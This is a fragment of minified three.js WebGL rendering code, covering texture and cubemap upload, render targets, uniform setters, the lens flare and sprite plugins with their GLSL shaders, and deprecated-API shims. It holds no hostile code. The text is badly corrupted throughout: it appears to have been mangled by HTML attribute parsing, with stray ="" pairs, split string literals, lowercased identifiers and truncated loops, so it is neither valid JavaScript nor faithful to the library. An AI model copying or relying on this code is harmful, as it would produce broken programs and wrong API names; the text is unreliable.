three.compressedtexture)for(b=\"0,F=I.length;B<F;B++)p=I[B],b.format!==THREE.RGBAFormat&&b.format!==THREE.RGBFormat?-1<c.getCompressedTextureFormats().indexOf(r)?c.compressedTexImage2D(a.TEXTURE_2D,B,r,p.width,p.height,0,p.data):console.warn(\"THREE.WebGLRenderer:\" attempt=\"\" load=\"\" unsupported=\"\" compressed=\"\" format=\"\" .uploadtexture()\"):=\"\" c.teximage2d(a.texture_2d,b,r,p.width,p.height,0,r,s,p.data);else=\"\" if(0<i.length&&l){b=\"0;for(F=I.length;B<F;B++)p=I[B],c.texImage2D(a.TEXTURE_2D,B,r,r,s,p);b.generateMipmaps=!1}else\" c.teximage2d(a.texture_2d,0,r,r,s,p);b.generatemipmaps&&l&&a.generatemipmap(a.texture_2d);m.__version=\"b.version;if(b.onUpdate)b.onUpdate(b);return}}c.activeTexture(a.TEXTURE0+g);c.bindTexture(a.TEXTURE_2D,m.__webglTexture)}function\" q(c,g,h){h?(a.texparameteri(c,a.texture_wrap_s,f(g.wraps)),a.texparameteri(c,a.texture_wrap_t,=\"\" f(g.wrapt)),a.texparameteri(c,a.texture_mag_filter,f(g.magfilter)),a.texparameteri(c,a.texture_min_filter,f(g.minfilter))):(a.texparameteri(c,a.texture_wrap_s,a.clamp_to_edge),a.texparameteri(c,a.texture_wrap_t,a.clamp_to_edge),g.wraps=\"==THREE.ClampToEdgeWrapping&&g.wrapT===THREE.ClampToEdgeWrapping||console.warn(\"THREE.WebGLRenderer:\" two.=\"\" texture.wraps=\"\" and=\"\" texture.wrapt=\"\" should=\"\" be=\"\" set=\"\" three.clamptoedgewrapping.\",g),a.texparameteri(c,a.texture_mag_filter,l(g.magfilter)),=\"\" a.texparameteri(c,a.texture_min_filter,l(g.minfilter)),g.minfilter!=\"=THREE.NearestFilter&&g.minFilter!==THREE.LinearFilter&&console.warn(\"THREE.WebGLRenderer:\" texture.minfilter=\"\" three.nearestfilter=\"\" or=\"\" three.linearfilter.\",g));!(h=\"b.get(\"EXT_texture_filter_anisotropic\"))||g.type===THREE.FloatType&&null===b.get(\"OES_texture_float_linear\")||g.type===THREE.HalfFloatType&&null===b.get(\"OES_texture_half_float_linear\")||!(1<g.anisotropy||d.get(g).__currentAnisotropy)||\" (a.texparameterf(c,h.texture_max_anisotropy_ext,math.min(g.anisotropy,e.getmaxanisotropy())),d.get(g).__currentanisotropy=\"g.anisotropy)}function\" r(b,e,g,h){var=\"\" k=\"f(e.texture.format),l=f(e.texture.type);c.texImage2D(h,0,k,e.width,e.height,0,k,l,null);a.bindFramebuffer(a.FRAMEBUFFER,b);a.framebufferTexture2D(a.FRAMEBUFFER,g,h,d.get(e.texture).__webglTexture,0);a.bindFramebuffer(a.FRAMEBUFFER,null)}function\" s(b,c){a.bindrenderbuffer(a.renderbuffer,b);c.depthbuffer&&!c.stencilbuffer?(a.renderbufferstorage(a.renderbuffer,=\"\" a.depth_component16,c.width,c.height),a.framebufferrenderbuffer(a.framebuffer,a.depth_attachment,a.renderbuffer,b)):c.depthbuffer&&c.stencilbuffer?(a.renderbufferstorage(a.renderbuffer,a.depth_stencil,c.width,c.height),a.framebufferrenderbuffer(a.framebuffer,a.depth_stencil_attachment,a.renderbuffer,b)):a.renderbufferstorage(a.renderbuffer,a.rgba4,c.width,c.height);a.bindrenderbuffer(a.renderbuffer,null)}var=\"\" t=\"g.memory,u=\"undefined\"!==typeof\" webgl2renderingcontext&&a=\"\" webgl2renderingcontext;=\"\" this.settexture2d=\"m;this.setTextureCube=function(b,g){var\" m=\"b\" three.compressedtexture,p=\"b.image[0]instanceof\" three.datatexture,r=\"[],s=0;6\">s;s++)r[s]=\nm||p?p?b.image[s].image:b.image[s]:h(b.image[s],e.maxCubemapSize);var u=k(r[0]),B=f(b.format),F=f(b.type);q(a.TEXTURE_CUBE_MAP,b,u);for(s=0;6>s;s++)if(m)for(var K,P=r[s].mipmaps,M=0,H=P.length;M<h;m++)k=p[m],b.format!==three.rgbaformat&&b.format!==three.rgbformat?-1<c.getcompressedtextureformats().indexof(b)?c.compressedteximage2d(a.texture_cube_map_positive_x+s,m,b,k.width,k.height,0,k.data):console.warn(\"three.webglrenderer: attempt=\"\" to=\"\" load=\"\" unsupported=\"\" compressed=\"\" texture=\"\" format=\"\" in=\"\" .settexturecube()\"):=\"\" c.teximage2d(a.texture_cube_map_positive_x+s,m,b,k.width,k.height,0,b,f,k.data);else=\"\" p?c.teximage2d(a.texture_cube_map_positive_x+s,0,b,r[s].width,r[s].height,0,b,f,r[s].data):c.teximage2d(a.texture_cube_map_positive_x+s,0,b,b,f,r[s]);b.generatemipmaps&&u&&a.generatemipmap(a.texture_cube_map);l.__version=\"b.version;if(b.onUpdate)b.onUpdate(b)}else\" c.activetexture(a.texture0+g),c.bindtexture(a.texture_cube_map,l.__image__webgltexturecube)};this.settexturecubedynamic=\"function(b,e){c.activeTexture(a.TEXTURE0+\" e);c.bindtexture(a.texture_cube_map,d.get(b).__webgltexture)};this.setuprendertarget=\"function(b){var\" e=\"d.get(b),f=d.get(b.texture);b.addEventListener(\"dispose\",p);f.__webglTexture=a.createTexture();t.textures++;var\" g=\"b\" instanceof=\"\" three.webglrendertargetcube,h=\"k(b);if(g){e.__webglFramebuffer=[];for(var\" l=\"0;6\">l;l++)e.__webglFramebuffer[l]=a.createFramebuffer()}else e.__webglFramebuffer=a.createFramebuffer();if(g){c.bindTexture(a.TEXTURE_CUBE_MAP,f.__webglTexture);q(a.TEXTURE_CUBE_MAP,b.texture,h);for(l=\n0;6>l;l++)r(e.__webglFramebuffer[l],b,a.COLOR_ATTACHMENT0,a.TEXTURE_CUBE_MAP_POSITIVE_X+l);b.texture.generateMipmaps&&h&&a.generateMipmap(a.TEXTURE_CUBE_MAP);c.bindTexture(a.TEXTURE_CUBE_MAP,null)}else c.bindTexture(a.TEXTURE_2D,f.__webglTexture),q(a.TEXTURE_2D,b.texture,h),r(e.__webglFramebuffer,b,a.COLOR_ATTACHMENT0,a.TEXTURE_2D),b.texture.generateMipmaps&&h&&a.generateMipmap(a.TEXTURE_2D),c.bindTexture(a.TEXTURE_2D,null);if(b.depthBuffer){e=d.get(b);f=b instanceof THREE.WebGLRenderTargetCube;if(b.depthTexture){if(f)throw Error(\"target.depthTexture not supported in Cube render targets\");\nif(b instanceof THREE.WebGLRenderTargetCube)throw Error(\"Depth Texture with cube render targets is not supported!\");a.bindFramebuffer(a.FRAMEBUFFER,e.__webglFramebuffer);if(!(b.depthTexture instanceof THREE.DepthTexture))throw Error(\"renderTarget.depthTexture must be an instance of THREE.DepthTexture\");d.get(b.depthTexture).__webglTexture&&b.depthTexture.image.width===b.width&&b.depthTexture.image.height===b.height||(b.depthTexture.image.width=b.width,b.depthTexture.image.height=b.height,b.depthTexture.needsUpdate=\n!0);m(b.depthTexture,0);b=d.get(b.depthTexture).__webglTexture;a.framebufferTexture2D(a.FRAMEBUFFER,a.DEPTH_ATTACHMENT,a.TEXTURE_2D,b,0)}else if(f)for(e.__webglDepthbuffer=[],f=0;6>f;f++)a.bindFramebuffer(a.FRAMEBUFFER,e.__webglFramebuffer[f]),e.__webglDepthbuffer[f]=a.createRenderbuffer(),s(e.__webglDepthbuffer[f],b);else a.bindFramebuffer(a.FRAMEBUFFER,e.__webglFramebuffer),e.__webglDepthbuffer=a.createRenderbuffer(),s(e.__webglDepthbuffer,b);a.bindFramebuffer(a.FRAMEBUFFER,null)}};this.updateRenderTargetMipmap=\nfunction(b){var e=b.texture;e.generateMipmaps&&k(b)&&e.minFilter!==THREE.NearestFilter&&e.minFilter!==THREE.LinearFilter&&(b=b instanceof THREE.WebGLRenderTargetCube?a.TEXTURE_CUBE_MAP:a.TEXTURE_2D,e=d.get(e).__webglTexture,c.bindTexture(b,e),a.generateMipmap(b),c.bindTexture(b,null))}};\nTHREE.WebGLUniforms=function(){var a=new THREE.Texture,b=new THREE.CubeTexture,c=[],d=[],e=function(a,b,d){var e=a[0];if(0>=e||0<e)return 0=\"==g&&(g=new\" 1=\"\" 2=\"\" a;var=\"\" f=\"b*d,g=c[f];void\" float32array(f),c[f]=\"g);if(0!==b)for(e.toArray(g,0),e=1,f=0;e!==b;++e)f+=d,a[e].toArray(g,f);return\" g},f=\"function(a,b){var\" c=\"d[b];void\" int32array(b),d[b]=\"c);for(var\" e=\"0;e!==b;++e)c[e]=a.allocTextureUnit();return\" c},g=\"function(a,b){a.uniform1f(this.addr,b)},h=function(a,b){a.uniform1i(this.addr,b)},k=function(a,\" b){void=\"\" 0!=\"=b.x?a.uniform3f(this.addr,b.x,b.y,b.z):void\" function(b,c,d){var=\"\" 5126:return=\"\" g;case=\"\" 35664:return=\"\" k;case=\"\" 35665:return=\"\" l;case=\"\" 35666:return=\"\" n;case=\"\" 35674:return=\"\" p;case=\"\" 35675:return=\"\" m;case=\"\" 35676:return=\"\" q;case=\"\" 35678:return=\"\" r;case=\"\" 35680:return=\"\" s;=\"\" case=\"\" 5124:case=\"\" 35670:return=\"\" h;case=\"\" 35667:case=\"\" 35671:return=\"\" t;case=\"\" 35668:case=\"\" 35672:return=\"\" u;case=\"\" 35669:case=\"\" 35673:return=\"\" v}},w=\"function(a,b){a.uniform1fv(this.addr,b)},E=function(a,b){a.uniform1iv(this.addr,b)},z=function(a,b){a.uniform2fv(this.addr,e(b,this.size,2))},y=function(a,b){a.uniform3fv(this.addr,e(b,this.size,3))},A=function(a,b){a.uniform4fv(this.addr,e(b,this.size,4))},I=function(a,b){a.uniformMatrix2fv(this.addr,!1,e(b,this.size,4))},B=function(a,b){a.uniformMatrix3fv(this.addr,!1,e(b,\" this.size,9))},f=\"function(a,b){a.uniformMatrix4fv(this.addr,!1,e(b,this.size,16))},K=function(b,c,d){var\" w;case=\"\" z;case=\"\" y;case=\"\" a;case=\"\" i;case=\"\" b;case=\"\" f;case=\"\" p;=\"\" e;case=\"\" v}},h=\"function(a,b,c){this.id=a;this.addr=c;this.setValue=C(b.type)},L=function(a,b,c){this.id=a;this.addr=c;this.size=b.size;this.setValue=M(b.type)},O=function(a){this.id=a;this.seq=[];this.map={}};O.prototype.setValue=function(a,b){for(var\" n=\"/([\\w\\d_]+)(\\])?(\\[|\\.)?/g,Q=function(a,b,c){this.seq=[];this.map=\" {};this.renderer=\"c;c=a.getProgramParameter(b,a.ACTIVE_UNIFORMS);for(var\" d=\"0;d!==c;++d){var\" l=\"N.exec(h),m=N.lastIndex,n=l[1],p=l[3];\"]\"===l[2]&&(n|=0);if(void\" h(n,e,f):new=\"\" l(n,e,f);h.seq.push(e);h.map[e.id]=\"e;break}else\" p=\"g.map[n],void\" o(n),n=\"g,g=p,n.seq.push(g),n.map[g.id]=g),g=p}}};Q.prototype.setValue=function(a,b,c){b=this.map[b];\" void=\"\" g=\"b[e],h=c[g.id];!1!==h.needsUpdate&&g.setValue(a,h.value,d)}};Q.seqWithValue=function(a,b){for(var\" in=\"\" b&&c.push(f)}return=\"\" c};q.splitdynamic=\"function(a,b){for(var\" c};q.evaldynamic=\"function(a,b,c,d){for(var\" q}();=\"\" three.lensflareplugin=\"function(a,b){var\" c,d,e,f,g,h,k,l,n,p,m=\"a.context,q=a.state,r,s,t,u,v,C;this.render=function(w,E,z){if(0!==b.length){w=new\" three.vector3;var=\"\" y=\"z.w/z.z,A=.5*z.z,I=.5*z.w,B=16/z.w,F=new\" three.vector2(b*y,b),k=\"new\" three.vector3(1,1,0),p=\"new\" three.vector2(1,1),m=\"new\" three.box2;m.min.set(0,0);m.max.set(z.z-16,z.w-16);if(void=\"\" b=\"new\" float32array([-1,-1,0,0,1,-1,1,0,1,1,1,1,-1,1,0,1]),h=\"new\" uint16array([0,1,2,0,2,3]);r=\"m.createBuffer();s=m.createBuffer();m.bindBuffer(m.ARRAY_BUFFER,\" r);m.bufferdata(m.array_buffer,b,m.static_draw);m.bindbuffer(m.element_array_buffer,s);m.bufferdata(m.element_array_buffer,h,m.static_draw);v=\"m.createTexture();C=m.createTexture();q.bindTexture(m.TEXTURE_2D,v);m.texImage2D(m.TEXTURE_2D,0,m.RGB,16,16,0,m.RGB,m.UNSIGNED_BYTE,null);m.texParameteri(m.TEXTURE_2D,m.TEXTURE_WRAP_S,m.CLAMP_TO_EDGE);m.texParameteri(m.TEXTURE_2D,m.TEXTURE_WRAP_T,m.CLAMP_TO_EDGE);m.texParameteri(m.TEXTURE_2D,m.TEXTURE_MAG_FILTER,m.NEAREST);m.texParameteri(m.TEXTURE_2D,m.TEXTURE_MIN_FILTER,\" m.nearest);q.bindtexture(m.texture_2d,c);m.teximage2d(m.texture_2d,0,m.rgba,16,16,0,m.rgba,m.unsigned_byte,null);m.texparameteri(m.texture_2d,m.texture_wrap_s,m.clamp_to_edge);m.texparameteri(m.texture_2d,m.texture_wrap_t,m.clamp_to_edge);m.texparameteri(m.texture_2d,m.texture_mag_filter,m.nearest);m.texparameteri(m.texture_2d,m.texture_min_filter,m.nearest);var=\"\" lowp=\"\" int=\"\" rendertype;\\nuniform=\"\" vec3=\"\" screenposition;\\nuniform=\"\" vec2=\"\" scale;\\nuniform=\"\" float=\"\" rotation;\\nuniform=\"\" sampler2d=\"\" occlusionmap;\\nattribute=\"\" position;\\nattribute=\"\" uv;\\nvarying=\"\" vuv;\\nvarying=\"\" vvisibility;\\nvoid=\"\" main()=\"\" {\\nvuv=\"uv;\\nvec2\" pos=\"position;\\nif\" (=\"\" rendertype=\"=\" )=\"\" {\\nvec4=\"\" visibility=\"texture2D(\" occlusionmap,=\"\" vec2(=\"\" 0.1,=\"\" 0.1=\"\" );\\nvisibility=\"\" +=\"texture2D(\" 0.5,=\"\" 0.9,=\"\" 0.5=\"\" 0.9=\"\" );\\nvvisibility=\"visibility.r\" 9.0;\\nvvisibility=\"\" *=\"1.0\" -=\"\" visibility.g=\"\" visibility.a=\"\" 9.0;\\npos.x=\"cos(\" rotation=\"\" position.x=\"\" sin(=\"\" position.y;\\npos.y=\"sin(\" cos(=\"\" position.y;\\n}\\ngl_position=\"vec4(\" scale=\"\" screenposition.xy=\"\" ).xy,=\"\" screenposition.z,=\"\" 1.0=\"\" );\\n}\",=\"\" fragmentshader:\"uniform=\"\" map;\\nuniform=\"\" opacity;\\nuniform=\"\" color;\\nvarying=\"\" {\\nif=\"\" {\\ngl_fragcolor=\"vec4(\" 1.0,=\"\" 0.0,=\"\" 0.0=\"\" );\\n}=\"\" else=\"\" if=\"\" map,=\"\" vuv=\"\" texture=\"texture2D(\" );\\ntexture.a=\"\" vvisibility;\\ngl_fragcolor=\"texture;\\ngl_FragColor.rgb\" o=\"m.createShader(m.VERTEX_SHADER),N=\"precision\" \"+a.getprecision()+\"=\"\" float;\\n\";m.shadersource(l,n+b.fragmentshader);m.shadersource(o,n+b.vertexshader);m.compileshader(l);m.compileshader(o);m.attachshader(h,l);m.attachshader(h,o);m.linkprogram(h);u=\"H;n=m.getAttribLocation(u,\"position\");p=m.getAttribLocation(u,\"uv\");c=m.getUniformLocation(u,\"renderType\");d=m.getUniformLocation(u,\"map\");e=m.getUniformLocation(u,\"occlusionMap\");f=m.getUniformLocation(u,\"opacity\");g=m.getUniformLocation(u,\"color\");h=m.getUniformLocation(u,\" \"scale\");k=\"m.getUniformLocation(u,\"rotation\");l=m.getUniformLocation(u,\"screenPosition\")}m.useProgram(u);q.initAttributes();q.enableAttribute(n);q.enableAttribute(p);q.disableUnusedAttributes();m.uniform1i(e,0);m.uniform1i(d,1);m.bindBuffer(m.ARRAY_BUFFER,r);m.vertexAttribPointer(n,2,m.FLOAT,!1,16,0);m.vertexAttribPointer(p,2,m.FLOAT,!1,16,8);m.bindBuffer(m.ELEMENT_ARRAY_BUFFER,s);q.disable(m.CULL_FACE);q.setDepthWrite(!1);H=0;for(L=b.length;H<L;H++)if(B=16/z.w,F.set(B*y,B),O=b[H],w.set(O.matrixWorld.elements[12],\" o.matrixworld.elements[13],o.matrixworld.elements[14]),w.applymatrix4(e.matrixworldinverse),w.applyprojection(e.projectionmatrix),k.copy(w),p.x=\"z.x+K.x*A+A-8,P.y=z.y+K.y*I+I-8,!0===M.containsPoint(P)){q.activeTexture(m.TEXTURE0);q.bindTexture(m.TEXTURE_2D,null);q.activeTexture(m.TEXTURE1);q.bindTexture(m.TEXTURE_2D,v);m.copyTexImage2D(m.TEXTURE_2D,0,m.RGB,P.x,P.y,16,16,0);m.uniform1i(c,0);m.uniform2f(h,F.x,F.y);m.uniform3f(l,K.x,K.y,K.z);q.disable(m.BLEND);q.enable(m.DEPTH_TEST);m.drawElements(m.TRIANGLES,\" 6,m.unsigned_short,0);q.activetexture(m.texture0);q.bindtexture(m.texture_2d,c);m.copyteximage2d(m.texture_2d,0,m.rgba,p.x,p.y,16,16,0);m.uniform1i(c,1);q.disable(m.depth_test);q.activetexture(m.texture1);q.bindtexture(m.texture_2d,v);m.drawelements(m.triangles,6,m.unsigned_short,0);o.positionscreen.copy(k);o.customupdatecallback?o.customupdatecallback(o):o.updatelensflares();m.uniform1i(c,2);q.enable(m.blend);for(var=\"\" j=\"O.lensFlares[N];.001<J.opacity&&.001<J.scale&&\" (k.x=\"J.x,K.y=J.y,K.z=J.z,B=J.size*J.scale/z.w,F.x=B*y,F.y=B,m.uniform3f(l,K.x,K.y,K.z),m.uniform2f(h,F.x,F.y),m.uniform1f(k,J.rotation),m.uniform1f(f,J.opacity),m.uniform3f(g,J.color.r,J.color.g,J.color.b),q.setBlending(J.blending,J.blendEquation,J.blendSrc,J.blendDst),a.setTexture2D(J.texture,1),m.drawElements(m.TRIANGLES,6,m.UNSIGNED_SHORT,0))}}q.enable(m.CULL_FACE);q.enable(m.DEPTH_TEST);q.setDepthWrite(!0);a.resetGLState()}}};\" three.spriteplugin=\"function(a,b){var\" c,d,e,f,g,h,k,l,n,p,m,q,r,s,t,u,v;function=\"\" c(a,b){return=\"\" a.renderorder!=\"=b.renderOrder?a.renderOrder-b.renderOrder:a.z!==b.z?b.z-a.z:b.id-a.id}var\" w=\"a.context,E=a.state,z,y,A,I,B=new\" three.vector3,f=\"new\" three.quaternion,k=\"new\" three.vector3;this.render=\"function(P,M){if(0!==b.length){if(void\" h=\"new\" float32array([-.5,-.5,0,0,.5,-.5,1,0,.5,.5,1,1,-.5,.5,0,1]),l=\"new\" uint16array([0,1,2,0,2,3]);z=\"w.createBuffer();y=w.createBuffer();w.bindBuffer(w.ARRAY_BUFFER,\" z);w.bufferdata(w.array_buffer,h,w.static_draw);w.bindbuffer(w.element_array_buffer,y);w.bufferdata(w.element_array_buffer,l,w.static_draw);var=\"\" float;\",\"uniform=\"\" mat4=\"\" modelviewmatrix;\\nuniform=\"\" projectionmatrix;\\nuniform=\"\" uvoffset;\\nuniform=\"\" uvscale;\\nattribute=\"\" vuv;\\nvoid=\"\" uv=\"\" uvscale;\\nvec2=\"\" alignedposition=\"position\" scale;\\nvec2=\"\" rotatedposition;\\nrotatedposition.x=\"cos(\" alignedposition.x=\"\" alignedposition.y;\\nrotatedposition.y=\"sin(\" alignedposition.y;\\nvec4=\"\" finalposition;\\nfinalposition=\"modelViewMatrix\" vec4(=\"\" );\\nfinalposition.xy=\"\" ==\"\" projectionmatrix=\"\" finalposition;\\ngl_position=\"finalPosition;\\n}\"].join(\"\\n\"));\" w.shadersource(o,[\"precision=\"\" color;\\nuniform=\"\" fogtype;\\nuniform=\"\" fogcolor;\\nuniform=\"\" fogdensity;\\nuniform=\"\" fognear;\\nuniform=\"\" fogfar;\\nuniform=\"\" alphatest;\\nvarying=\"\" );\\nif=\"\" texture.a=\"\" <=\"\" alphatest=\"\" discard;\\ngl_fragcolor=\"vec4(\" color=\"\" texture.xyz,=\"\" opacity=\"\" fogtype=\"\"> 0 ) {\\nfloat depth = gl_FragCoord.z / gl_FragCoord.w;\\nfloat fogFactor = 0.0;\\nif ( fogType == 1 ) {\\nfogFactor = smoothstep( fogNear, fogFar, depth );\\n} else {\\nconst float LOG2 = 1.442695;\\nfogFactor = exp2( - fogDensity * fogDensity * depth * depth * LOG2 );\\nfogFactor = 1.0 - clamp( fogFactor, 0.0, 1.0 );\\n}\\ngl_FragColor = mix( gl_FragColor, vec4( fogColor, gl_FragColor.w ), fogFactor );\\n}\\n}\"].join(\"\\n\"));\nw.compileShader(L);w.compileShader(O);w.attachShader(H,L);w.attachShader(H,O);w.linkProgram(H);A=H;u=w.getAttribLocation(A,\"position\");v=w.getAttribLocation(A,\"uv\");c=w.getUniformLocation(A,\"uvOffset\");d=w.getUniformLocation(A,\"uvScale\");e=w.getUniformLocation(A,\"rotation\");f=w.getUniformLocation(A,\"scale\");g=w.getUniformLocation(A,\"color\");h=w.getUniformLocation(A,\"map\");k=w.getUniformLocation(A,\"opacity\");l=w.getUniformLocation(A,\"modelViewMatrix\");n=w.getUniformLocation(A,\"projectionMatrix\");p=\nw.getUniformLocation(A,\"fogType\");m=w.getUniformLocation(A,\"fogDensity\");q=w.getUniformLocation(A,\"fogNear\");r=w.getUniformLocation(A,\"fogFar\");s=w.getUniformLocation(A,\"fogColor\");t=w.getUniformLocation(A,\"alphaTest\");H=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\");H.width=8;H.height=8;L=H.getContext(\"2d\");L.fillStyle=\"white\";L.fillRect(0,0,8,8);I=new THREE.Texture(H);I.needsUpdate=!0}w.useProgram(A);E.initAttributes();E.enableAttribute(u);E.enableAttribute(v);E.disableUnusedAttributes();\nE.disable(w.CULL_FACE);E.enable(w.BLEND);w.bindBuffer(w.ARRAY_BUFFER,z);w.vertexAttribPointer(u,2,w.FLOAT,!1,16,0);w.vertexAttribPointer(v,2,w.FLOAT,!1,16,8);w.bindBuffer(w.ELEMENT_ARRAY_BUFFER,y);w.uniformMatrix4fv(n,!1,M.projectionMatrix.elements);E.activeTexture(w.TEXTURE0);w.uniform1i(h,0);L=H=0;(O=P.fog)?(w.uniform3f(s,O.color.r,O.color.g,O.color.b),O instanceof THREE.Fog?(w.uniform1f(q,O.near),w.uniform1f(r,O.far),w.uniform1i(p,1),L=H=1):O instanceof THREE.FogExp2&&(w.uniform1f(m,O.density),\nw.uniform1i(p,2),L=H=2)):(w.uniform1i(p,0),L=H=0);for(var O=0,N=b.length;O<n;o++){var q=\"b[O];Q.modelViewMatrix.multiplyMatrices(M.matrixWorldInverse,Q.matrixWorld);Q.z=-Q.modelViewMatrix.elements[14]}b.sort(C);for(var\" j=\"[],O=0,N=b.length;O<N;O++){var\" w.uniform2f(d,d.map.repeat.x,d.map.repeat.y)):(w.uniform2f(c,0,0),w.uniform2f(d,1,1));w.uniform1f(k,d.opacity);w.uniform3f(g,d.color.r,d.color.g,d.color.b);w.uniform1f(e,d.rotation);w.uniform2fv(f,j);e.setblending(d.blending,d.blendequation,d.blendsrc,d.blenddst);e.setdepthtest(d.depthtest);e.setdepthwrite(d.depthwrite);d.map?a.settexture2d(d.map,0):a.settexture2d(i,0);w.drawelements(w.triangles,6,w.unsigned_short,0)}e.enable(w.cull_face);a.resetglstate()}}};=\"\" object.assign(three,{face4:function(a,b,c,d,e,f,g){console.warn(\"three.face4=\"\" has=\"\" been=\"\" removed.=\"\" a=\"\" three.face3=\"\" will=\"\" be=\"\" created=\"\" instead.\");return=\"\" new=\"\" three.face3(a,b,c,e,f,g)},linestrip:0,linepieces:1,meshfacematerial:three.multimaterial,pointcloud:function(a,b){console.warn(\"three.pointcloud=\"\" renamed=\"\" to=\"\" three.points.\");return=\"\" three.points(a,b)},particle:three.sprite,particlesystem:function(a,b){console.warn(\"three.particlesystem=\"\" three.points(a,=\"\" b)},pointcloudmaterial:function(a){console.warn(\"three.pointcloudmaterial=\"\" three.pointsmaterial.\");return=\"\" three.pointsmaterial(a)},particlebasicmaterial:function(a){console.warn(\"three.particlebasicmaterial=\"\" three.pointsmaterial(a)},particlesystemmaterial:function(a){console.warn(\"three.particlesystemmaterial=\"\" three.pointsmaterial(a)},vertex:function(a,b,c){console.warn(\"three.vertex=\"\" use=\"\" three.vector3=\"\" instead.\");=\"\" return=\"\" three.vector3(a,b,c)}});object.assign(three.box2.prototype,{empty:function(){console.warn(\"three.box2:=\"\" .empty()=\"\" .isempty().\");return=\"\" this.isempty()},isintersectionbox:function(a){console.warn(\"three.box2:=\"\" .isintersectionbox()=\"\" .intersectsbox().\");return=\"\" this.intersectsbox(a)}});=\"\" object.assign(three.box3.prototype,{empty:function(){console.warn(\"three.box3:=\"\" this.isempty()},isintersectionbox:function(a){console.warn(\"three.box3:=\"\" this.intersectsbox(a)},isintersectionsphere:function(a){console.warn(\"three.box3:=\"\" .isintersectionsphere()=\"\" .intersectssphere().\");return=\"\" this.intersectssphere(a)}});=\"\" object.assign(three.matrix3.prototype,{multiplyvector3:function(a){console.warn(\"three.matrix3:=\"\" .multiplyvector3()=\"\" vector.applymatrix3(=\"\" matrix=\"\" )=\"\" a.applymatrix3(this)},multiplyvector3array:function(a){console.warn(\"three.matrix3:=\"\" .multiplyvector3array()=\"\" renamed.=\"\" matrix.applytovector3array(=\"\" array=\"\" this.applytovector3array(a)}});=\"\" object.assign(three.matrix4.prototype,{extractposition:function(a){console.warn(\"three.matrix4:=\"\" .extractposition()=\"\" .copyposition().\");return=\"\" this.copyposition(a)},setrotationfromquaternion:function(a){console.warn(\"three.matrix4:=\"\" .setrotationfromquaternion()=\"\" .makerotationfromquaternion().\");return=\"\" this.makerotationfromquaternion(a)},multiplyvector3:function(a){console.warn(\"three.matrix4:=\"\" vector.applymatrix4(=\"\" or=\"\" vector.applyprojection(=\"\" a.applyprojection(this)},multiplyvector4:function(a){console.warn(\"three.matrix4:=\"\" .multiplyvector4()=\"\" a.applymatrix4(this)},multiplyvector3array:function(a){console.warn(\"three.matrix4:=\"\" this.applytovector3array(a)},rotateaxis:function(a){console.warn(\"three.matrix4:=\"\" .rotateaxis()=\"\" vector3.transformdirection(=\"\" a.transformdirection(this)},crossvector:function(a){console.warn(\"three.matrix4:=\"\" .crossvector()=\"\" a.applymatrix4(this)},translate:function(a){console.error(\"three.matrix4:=\"\" .translate()=\"\" removed.\")},rotatex:function(a){console.error(\"three.matrix4:=\"\" .rotatex()=\"\" removed.\")},rotatey:function(a){console.error(\"three.matrix4:=\"\" .rotatey()=\"\" removed.\")},rotatez:function(a){console.error(\"three.matrix4:=\"\" .rotatez()=\"\" removed.\")},=\"\" rotatebyaxis:function(a,b){console.error(\"three.matrix4:=\"\" .rotatebyaxis()=\"\" removed.\")}});object.assign(three.plane.prototype,{isintersectionline:function(a){console.warn(\"three.plane:=\"\" .isintersectionline()=\"\" .intersectsline().\");return=\"\" this.intersectsline(a)}});object.assign(three.quaternion.prototype,{multiplyvector3:function(a){console.warn(\"three.quaternion:=\"\" is=\"\" now=\"\" vector.applyquaternion(=\"\" quaternion=\"\" a.applyquaternion(this)}});=\"\" object.assign(three.ray.prototype,{isintersectionbox:function(a){console.warn(\"three.ray:=\"\" this.intersectsbox(a)},isintersectionplane:function(a){console.warn(\"three.ray:=\"\" .isintersectionplane()=\"\" .intersectsplane().\");return=\"\" this.intersectsplane(a)},isintersectionsphere:function(a){console.warn(\"three.ray:=\"\" object.assign(three.vector3.prototype,{seteulerfromrotationmatrix:function(){console.error(\"three.vector3:=\"\" .seteulerfromrotationmatrix()=\"\" euler.setfromrotationmatrix()=\"\" instead.\")},seteulerfromquaternion:function(){console.error(\"three.vector3:=\"\" .seteulerfromquaternion()=\"\" euler.setfromquaternion()=\"\" instead.\")},getpositionfrommatrix:function(a){console.warn(\"three.vector3:=\"\" .getpositionfrommatrix()=\"\" .setfrommatrixposition().\");return=\"\" this.setfrommatrixposition(a)},=\"\" getscalefrommatrix:function(a){console.warn(\"three.vector3:=\"\" .getscalefrommatrix()=\"\" .setfrommatrixscale().\");return=\"\" this.setfrommatrixscale(a)},getcolumnfrommatrix:function(a,b){console.warn(\"three.vector3:=\"\" .getcolumnfrommatrix()=\"\" .setfrommatrixcolumn().\");return=\"\" this.setfrommatrixcolumn(b,a)}});=\"\" object.assign(three.object3d.prototype,{getchildbyname:function(a){console.warn(\"three.object3d:=\"\" .getchildbyname()=\"\" .getobjectbyname().\");return=\"\" this.getobjectbyname(a)},renderdepth:function(a){console.warn(\"three.object3d:=\"\" .renderdepth=\"\" .renderorder,=\"\" instead.\")},translate:function(a,b){console.warn(\"three.object3d:=\"\" .translateonaxis(=\"\" axis,=\"\" distance=\"\" this.translateonaxis(b,a)}});=\"\" object.defineproperties(three.object3d.prototype,{eulerorder:{get:function(){console.warn(\"three.object3d:=\"\" .eulerorder=\"\" .rotation.order.\");return=\"\" this.rotation.order},set:function(a){console.warn(\"three.object3d:=\"\" .rotation.order.\");this.rotation.order=\"a}},useQuaternion:{get:function(){console.warn(\"THREE.Object3D:\" .usequaternion=\"\" the=\"\" library=\"\" uses=\"\" quaternions=\"\" by=\"\" default.\")},set:function(a){console.warn(\"three.object3d:=\"\" default.\")}}});=\"\" object.defineproperties(three.lod.prototype,{objects:{get:function(){console.warn(\"three.lod:=\"\" .objects=\"\" .levels.\");return=\"\" this.levels}}});three.perspectivecamera.prototype.setlens=\"function(a,b){console.warn(\"THREE.PerspectiveCamera.setLens\" deprecated.=\"\" .setfocallength=\"\" and=\"\" .filmgauge=\"\" for=\"\" photographic=\"\" setup.\");void=\"\" 0!=\"=b&&(this.filmGauge=b);this.setFocalLength(a)};\" object.defineproperties(three.light.prototype,{onlyshadow:{set:function(a){console.warn(\"three.light:=\"\" .onlyshadow=\"\" removed.\")}},shadowcamerafov:{set:function(a){console.warn(\"three.light:=\"\" .shadowcamerafov=\"\" .shadow.camera.fov.\");this.shadow.camera.fov=\"a}},shadowCameraLeft:{set:function(a){console.warn(\"THREE.Light:\" .shadowcameraleft=\"\" 